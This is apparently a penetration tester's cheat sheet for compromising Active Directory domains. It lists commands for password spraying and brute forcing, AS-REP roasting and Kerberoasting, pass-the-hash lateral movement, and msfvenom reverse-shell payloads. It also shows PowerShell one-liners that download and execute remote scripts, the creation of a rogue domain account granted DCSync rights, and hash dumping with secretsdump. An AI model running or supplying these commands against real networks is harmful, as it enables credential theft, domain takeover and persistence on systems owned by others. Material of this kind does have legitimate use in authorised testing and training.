An Active Directory environment has a very critical dependency on a Domain Name System (DNS) service. 

A typical domain controller in an AD will also host a DNS server that is authoritative for a given domain.

An attack against Active Directory infrastructure begins with an exploit or client-side attack against a domain workstation or server followed by enumeration of the AD environment.

##### Main concepts of Active Directory:

- Directory – Contains all the information about the objects of the Active directory
- Object – An object references almost anything inside the directory (a user, group, shared folder...)
- Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection. 
- Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
- Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.



#### enum4linux
```
enum4linux -all $IP
```




- Password spray from LDAP / RPC findings
    - [simple pass.list](\wordlists\simple.txt)
```
# create password.list
for i in $(cat pass.list); do echo $i, echo $i2022, echo $i2021; echo $i!; done > tmp && cat tmp > pass.list
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/best64.rule | awk 'length {$0} > 8'
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/toggles1.rule | awk 'length {$0} > 8'
cat pass.list | sed '/^$/d' > tmp && cat tmp > pass.list

```

- crackmapexec password policy
    - enum4linux for groups, password policies etc
```
crackmapexec smb $IP -u "" -p "" --pass-pol # anonymous users in precompatiblity group in domains upgraded since 2003/2008
```

- crackmapexec bruteforce
```
crackmapexec smb $IP -u userlist -p passwordlist

```



- [kerbrute](https://github.com/TarlogicSecurity/kerbrute) bruteforce
```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

- [Rubeus](https://github.com/Zer1t0/Rubeus) bruteforce
```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```


- ASREPRoast with [impacket](https://github.com/SecureAuthCorp/impacket)
```
cp /usr/share/doc/python3-impacket/examples/GetNPUsers.py . # Users that do not require kerberos preauth
```

- hash cracking
```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>

```


- Kerberoast
```
# impacket
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>

# powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

# Rubeus

.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

```

- [Over pass the hash](https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/)
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

# Request the TGT with aesKey (more secure encryption & stealth)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]


# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# OR with Rubeus and PSExec

# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd

```

Note: consider group policy password grabs and cracks GPPDecrypt / Powerup / Empire
Note: Clock skew too great error ; date -s <new:time:required>


- login with crackmapexec
```
crackmapexec smb $IP -u owned_user -p cracked_hash --shares
```

- login with evil-winrm (from nmap all ports -p 5985)

```
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
evil-winrm -u owned_user -p cracked_hash -i $IP 
```

- get standard revshell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # stageless
msfvenom -p windows/x64/reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # staged
```

- transfer options
    - python -m SimpleHTTPServer + certutil -urlcache -split -f 
    - upload via evil-winrm
    - impacket-smbserver sharename $(pwd) -smb2support -user me -password mypass
    - IEX(New-Object Net.WebClient).downloadString('http://$myIP/filetograb.ps1')

- on target machine powershell
```
$pass = convertto-securestring 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user',$pass) # creates credential object on box
New-PSDrive -Name 'user' -PSProvider FileSystem -Credential $cred -Root \\$MyIP\Sharename
```


- priv esc steps
```
winPEAS.exe # unquoted paths, writable directories, unusual progs / services, interesting files, credentials, ninjacopy potentials
```
>  [bloodhound - for domain controllers](https://github.com/BloodHoundAD/BloodHound)
    - [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound3)

```
locate neo4j | grep auth # delete to reset password
neo4j console # user:pass = neo4j:neo4j
# upload SharpHound and extract generated zip file - .\SharpHound.exe -c all --zipfilename hellothere.zip --encryptzip --stealth
# mark owner as owned
# show shortest path
# show path from owned principles
# nslookup any new domain objects found
# Any writedacl permissions / Account Operators / Group Permissions / account creation
# Exchange Server Group Permissions
```

> adding users for priv esc [if able via compromised account permissions]
```
net user d4nk0 hell0w0rld /add /domain
net group "Group to Add user to" /add d4nk0
net group "Group to add user to" /add owned_user
Add-DomainObjectAcl - Credential $cred -TargetIdentity 'DC=box,DC=domain' -PrincipleIdentity created_owned_user -Rights DCSync
```

> [Powersploit](https://github.com/PowerShellMafia/PowerSploit.git) - required for Add-DomainObjectAcl
```
git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev # dev branch
powerview.ps1

```
> impacket - secretsdump.py # dumping hashes from box
```
./secretsdump.py box.domain/createduser:password@target_IP
# crack hashes
hashcat -m 1000 hash.dump /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
```

> impacket - psexec
```
psexec.py admin@target_IP -hashes # blank LM hash
```

- [Golden Ticket](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)



